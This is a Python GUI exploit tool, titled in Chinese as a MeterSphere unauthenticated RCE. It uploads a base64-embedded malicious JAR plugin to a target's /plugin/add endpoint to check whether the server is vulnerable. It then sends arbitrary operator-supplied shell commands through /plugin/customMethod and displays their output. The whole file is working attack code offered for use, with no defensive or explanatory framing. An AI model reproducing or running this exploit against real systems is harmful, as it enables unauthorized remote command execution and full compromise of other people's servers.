import requests
import base64
import json
import wx

class MainFrame(wx.Frame):            # 记住一定要从wx.Frame派生出主窗口类
  def __init__(self, p, t):
    wx.Frame.__init__(self, id=wx.ID_ANY, parent=p, title=t, size=(500, 300))
    panel = wx.Panel(self, wx.ID_ANY)
    text = wx.StaticText(panel,wx.ID_ANY,'待测IP',(30,30))
    text = wx.StaticText(panel, wx.ID_ANY, '待测端口', (260, 30))
    text = wx.StaticText(panel, wx.ID_ANY, '检测结果', (260, 75))
    text = wx.StaticText(panel, wx.ID_ANY, 'CMD', (30, 75))
    text = wx.StaticText(panel, wx.ID_ANY, '输出\n结果', (30, 140))
    self.inputip = wx.TextCtrl(panel,wx.ID_ANY,pos=(80,25),size=(150,30))
    self.inputport = wx.TextCtrl(panel,wx.ID_ANY,pos=(330,25),size=(150,30))
    self.inputcmd = wx.TextCtrl(panel,wx.ID_ANY,pos=(80,70),size=(150,30))
    self.outputdata = wx.TextCtrl(panel,wx.ID_ANY,pos=(330,70),size=(150,30))
    self.output = wx.TextCtrl(panel,wx.ID_ANY,pos=(80,120),size=(397,90))
    self.testing = wx.Button(panel, wx.ID_ANY, u"漏洞检测", pos=(100, 230))
    self.utilize = wx.Button(panel, wx.ID_ANY, u"漏洞利用", pos=(300, 230))

    self.Bind(wx.EVT_BUTTON, self.upload, self.testing)
    self.Bind(wx.EVT_BUTTON, self.cmd, self.utilize)


  def upload(self,even):
    baseJar = 'UEsDBBQACAgIABybKlQAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICAAcmypUAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAlY6BnEGxsYKmj4FyUm56QqOOcXFeQXJZYA1WvycvFyAQBQSwcIqN3V/EQAAABFAAAAUEsDBBQACAgIABebKlQAAAAAAAAAAAAAAAAKAAAAZXhlYy5jbGFzc41WS2wbRRj+JrE99mbzaJIm2bZpk5YWp4kT+qCP7TOPBkoTtyShkBYom/Um3dbxmvW67bES4oJUcemNO7m2EnIqIh6qEBJIcOLMiRsS4oKEhET4Zu3GdhOJWvLM+H98//f/88+Mf/z3y68BHMVdDQmcjeOchgjOS4yqeUxiXEMMExouYFLiNTW/LnFRQxMmJN7Q0KzmSxpaMRHHlMS08ktruIwrEm9q2I4ZiVkN3ZiTeEuDgatxvK3mdyTmNfQq/2sa9uCsGq6r4V2JKYHYaTfnBmcFGpMDVwUi417GEWidcnNOuri84Phz1kKWEt0uFgJvedoJbnoZgQPJqVvWHWska+WWRmYD380tnRrYLBJong0s+/a0lQ9xZEieeUu8x6yZK9NkhkxO4n2mInGDiTAH0hbQLtyznXzgermCxAf8PesVfduZdBWjhHPPsYdVSB0vYb/ANrUeVuGHZ4q5wF12dFhYYDZVXuNZq1DQYYM57KmK095s0b5ZTm4jpg4H+0lUxyKWBNqq5pcXbjl2oOMmXIG+qvxirhBYjGwp9w2cepNs1lmysqO27RQKNSaDVRPfWcwSnmh3PDuEmrP8JSeosY6o3OsolQuu4xZus5I6sliuVKSsv+J7KqKOHDwBI1S4HmPkiwF9HWt5xrEyjq9qmRfoemYwVlxcdHwnU9V+KAAdPgoCHRswl2vIdT/PaqzoZkPnAEUdd5Rn7+Z0x7nLgV+0A88X6Nmsf9Z6HVtwrytxuMdpL5j0irlMDS+56Plpa5mts/9/ujdEYPN2seoTjp21WIA6ekeS1zeZ1wJskRPhWvOMFIQHYs63bBJpLjhBuRXc8JRFktfUKWzKOXfLvaSMXq4LVu69umgVEfe7hu+zcp3fItcXI19GIGzMZSfeJpOTyc1RX5RbC7nV7Vh3smJXv5U07UluqVCV6aiqyh0ZSuPUZ9SVJdCZ3PIailn5vJNjOVIvdHFVOpaO8cAri9CPfby81acBQt04HA/wVy9nHglED65CPOaCO8YxFgoTHJMYoAtNG36itJnSf9obnqBxWqSHGr9CpIRoegWaGTG4lCkOcWFGUlQlSkq8gt1m1IiWoK+gs7xqUfbhqk2Y0aH2bRHizDe2t8+W0GFGlTZmxIgmOEeNCNWJ+cZBaju/xXYzpoCkIStA4apN2XeZcg3d84ZcRY8ZX4Mxb8RXscNMCFNr32k2GWS0y9SUk27oJew2tO+RWsOe+VX0GU0l9BsahxL2Vm3Xf63Yrqz/YjQ9Ykni2IZOlmIfUniFb5yaTRZGzRN849K4gQXqs7iPjyhX8wPKn+AbPGW9f8Pv+INzQ1jop8QAUWK8leJoIbZCb0UX2rAT7ehDB5G3E3sXLbtwmK/kca5N9OA0X8hRriewA5O0voTdjN7H+PvIoB8Z7IXLnc4y0n0MkU0SH3M7P+H6AQ7iUwziIZE/wzA+xwgeM8IXOESmR8j1GLkdxXd4FT8w4s84QeYmuZ8h+1P4k9H/4vpvnCMS8Ait6yQekRiUGJJISYIKiZGYEkdrxZJhqDnEp/Mwv0do0YXYcxaSsSvuBuRmpSQvUQVIQd/SRuKYxHGJE6FqSLmcjGU4JJgL+DdEMBfBXNS5OPMfUEsHCPVuc+C+BAAA6ggAAFBLAQIUABQACAgIABybKlQAAAAAAgAAAAAAAAAJAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi/+ygAAUEsBAhQAFAAICAgAHJsqVKjd1fxEAAAARQAAABQAAAAAAAAAAAAAAAAAPQAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQAFAAICAgAF5sqVPVuc+C+BAAA6ggAAAoAAAAAAAAAAAAAAAAAwwAAAGV4ZWMuY2xhc3NQSwUGAAAAAAMAAwC1AAAAuQUAAAAA'
    try:
        ip = self.inputip.GetValue()
        port = self.inputport.GetValue()
        url = 'http://' + ip + ':' + port
        response =  requests.post(url+'/plugin/add',files = {'file': ('exp.jar', base64.b64decode(baseJar.encode('utf-8')), 'text/plain')},timeout=5)
        print(response.text)
        if '解析插件失败，未找到入口配置' in response.content.decode('utf-8'):
            self.outputdata.SetValue('漏洞存在')
        else:
            self.outputdata.SetValue('漏洞不存在')
    except:
        ip = self.inputip.GetValue()
        port = self.inputport.GetValue()
        url = 'https://' + ip + ':' + port
        response =  requests.post(url+'/plugin/add',files = {'file': ('exp.jar', base64.b64decode(baseJar.encode('utf-8')), 'text/plain')},timeout=5)
        if '解析插件失败，未找到入口配置' in response.content.decode('utf-8'):
            self.outputdata.SetValue('漏洞存在')
        else:
            self.outputdata.SetValue('漏洞不存在')

  def cmd(self,even):
    try:
        ip = self.inputip.GetValue()
        port = self.inputport.GetValue()
        cm = self.inputcmd.GetValue()
        url = 'http://' + ip + ':' + port
        header = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'
        }
        data = '{"entry":"exec","request":"'+cm+'"}'
        req = requests.post(url+'/plugin/customMethod',data=data,headers=header)
        try:
            res = json.loads(req.content.decode('utf-8'))
            a = res['data']
            self.output.SetValue(a)

        except:
            self.output.SetValue('漏洞利用失败')
    except:
        ip = self.inputip.GetValue()
        port = self.inputport.GetValue()
        url = 'https://' + ip + ':' + port
        header = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'
        }
        data = '{"entry":"exec","request":"' + cm + '"}'
        req = requests.post(url + '/plugin/customMethod', data=data, headers=header)
        try:
            res = json.loads(req.content.decode('utf-8'))
            a = res['data']
            self.output.SetValue(a)
        except:
            self.output.SetValue('漏洞利用失败')

if __name__ == "__main__":
    app = wx.App(False)
    # frame就是应用程序的主窗口
    frame = MainFrame(None, "MeterSphere未授权RCE")
    frame.Show(True)  # 显示该窗口
    app.MainLoop()